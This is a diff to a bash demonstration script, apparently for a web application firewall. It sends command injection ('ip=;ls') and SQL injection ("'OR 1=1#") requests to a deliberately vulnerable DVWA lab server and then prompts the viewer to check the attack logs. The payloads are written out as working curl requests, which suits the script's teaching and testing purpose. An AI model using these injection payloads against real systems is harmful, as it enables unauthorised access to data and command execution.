@@ -327,7 +327,7 @@ Exploit_CMDi_Attack() {
         -c cookie.txt
 
     echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/vulnerabilities/exec/${RESTORE} submit=${RED}\";ls\"\n"
-    curl 'https://dvwa.corp.fabriclab.ca/vulnerabilities/exec/' \
+    curl -s 'https://dvwa.corp.fabriclab.ca/vulnerabilities/exec/' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
@@ -336,7 +336,7 @@ Exploit_CMDi_Attack() {
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
         --data-raw 'ip=;ls&Submit=Submit' \
-        -b cookie.txt
+        -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'
 
     echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
@@ -358,7 +358,7 @@ Exploit_SQLi_Attack() {
         -c cookie.txt
 
     echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/vulnerabilities/sqli/${RESTORE} id=${RED}\"'OR 1=1#\"\n"
-    curl 'https://dvwa.corp.fabriclab.ca/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit' \
+    curl -s 'https://dvwa.corp.fabriclab.ca/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
@@ -366,7 +366,7 @@ Exploit_SQLi_Attack() {
         -H 'referer: https://dvwa.corp.fabriclab.ca/index.php' \
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
-        -b cookie.txt
+        -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'
 
     echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
@@ -397,7 +397,7 @@ Cookie_Security() {
     read response
 
     echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/security.php\n${RED}"
-    curl 'https://dvwa.corp.fabriclab.ca/security.php' \
+    curl -s 'https://dvwa.corp.fabriclab.ca/security.php' \
         -H 'authority: dvwa.corp.fabriclab.ca' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
@@ -405,7 +405,7 @@ Cookie_Security() {
         -H 'referer: https://dvwa.corp.fabriclab.ca/index.php' \
         -H 'user-agent: FortiWeb Demo Script' \
         --insecure \
-        -b cookie.txt
+        -b cookie.txt | grep -oP '(?<=<h3>).*?(?=</h3>)'
 
     echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
     read response
